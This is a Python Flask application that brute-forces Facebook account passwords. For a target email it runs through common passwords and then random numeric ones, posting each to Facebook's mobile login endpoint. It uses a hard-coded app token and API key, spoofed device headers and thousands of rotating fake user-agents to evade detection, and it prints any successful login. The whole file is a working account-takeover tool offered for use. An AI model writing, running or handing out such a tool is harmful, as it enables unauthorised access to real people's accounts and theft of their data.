from flask import Flask, render_template, request, redirect, url_for
import uuid
import requests
import random
import threading
import os
from colorama import Fore, Style, init

# Initialize colorama
init(autoreset=True)

app = Flask(__name__)

# List of frequently used passwords
common_passwords = [
    '123456', 'password', '123456789', '12345678', '12345', '1234567', '1234567890', 
    'qwerty', 'abc123', '111111', '123123', 'welcome', 'letmein', 'password1', '123qwe'
]

# List to hold generated user-agents
ugen = []

# Generate random user-agents
for xd in range(10000):
    a = 'Mozilla/5.0 (Symbian/3; Series60/5.2'
    b = random.randrange(1, 9)
    c = random.randrange(1, 9)
    d = 'NokiaN8-00/012.002;'
    e = random.randrange(100, 9999)
    f = 'Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/533.4 (KHTML, like Gecko) NokiaBrowser/'
    g = random.randrange(1, 9)
    h = random.randrange(1, 4)
    i = random.randrange(1, 4)
    j = random.randrange(1, 4)
    k = '7.3.0 Mobile Safari/533.4 3gpp-gba'
    
    uaku = f'{a}{b}.{c} {d}{e} {f}{g}.{h}.{i}.{j} {k}'
    ugen.append(uaku)

# Function to get a random user-agent from the generated list
def generate_user_agent():
    return random.choice(ugen)

# Function to generate random number-only passwords
def generate_password(length):
    return ''.join(random.choice('0123456789') for _ in range(length))

# Function to run the password-cracking process
def method_crack(email, password_length, num_attempts):
    for password in common_passwords:
        try_password(email, password)
    
    for _ in range(num_attempts):
        password = generate_password(password_length)
        try_password(email, password)

# Function to try a password and print the result
def try_password(email, password):
    try:
        print(Fore.YELLOW + f"\nTrying password: {password}")

        data = {
            "adid": str(uuid.uuid4()),
            "format": "json",
            "device_id": str(uuid.uuid4()),
            "cpl": "true",
            "family_device_id": str(uuid.uuid4()),
            "credentials_type": "device_based_login_password",
            "error_detail_type": "button_with_disabled",
            "source": "device_based_login",
            "email": email,
            "password": password,
            "access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32",
            "generate_session_cookies": "1",
            "meta_inf_fbmeta": "",
            "advertiser_id": str(uuid.uuid4()),
            "currently_logged_in_userid": "0",
            "locale": "en_GB",
            "client_country_code": "GB",
            "method": "auth.login",
            "fb_api_req_friendly_name": "authenticate",
            "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
            "api_key": "882a8490361da98702bf97a021ddc14d"
        }

        headers = {
            'User-Agent': generate_user_agent(),
            'Content-Type': 'application/x-www-form-urlencoded',
            'Host': 'graph.facebook.com',
            'X-FB-Net-HNI': str(random.randint(20000, 40000)),
            'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
            'X-FB-Connection-Type': 'MOBILE.LTE',
            'X-Tigon-Is-Retry': 'False',
            'X-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
            'X-fb-device-group': '5120',
            'X-FB-Friendly-Name': 'ViewerReactionsMutation',
            'X-FB-Request-Analytics-Tags': 'graphservice',
            'X-FB-HTTP-Engine': 'Liger',
            'X-FB-Client-IP': 'True',
            'X-FB-Server-Cluster': 'True',
            'X-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',
        }

        session = requests.Session()
        q = session.post("https://b-graph.facebook.com/auth/login", data=data, headers=headers, allow_redirects=False).json()

        if 'session_key' in q:
            uid = q.get('uid', email)
            print(Fore.GREEN + f'[LOGIN SUCCESS] {uid} | {password}')
        elif 'error_msg' in q:
            error_message = q['error_msg']
            print(Fore.RED + f'[LOGIN FAILED] {email} | {password} | Error: {error_message}')
    except Exception as e:
        print(Fore.RED + f'[ERROR] {e}')

# Web route for the main page
@app.route("/", methods=["GET", "POST"])
def index():
    if request.method == "POST":
        email = request.form["email"]
        password_length = int(request.form["password_length"])
        num_attempts = int(request.form["num_attempts"])

        # Start the password-cracking process in a background thread
        threading.Thread(target=method_crack, args=(email, password_length, num_attempts)).start()

        return redirect(url_for("status"))
    
    return render_template("index.html")

# Web route to display status
@app.route("/status")
def status():
    return "Password cracking is running in the background. Check your console for updates."

# Run the Flask app
if __name__ == "__main__":
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)
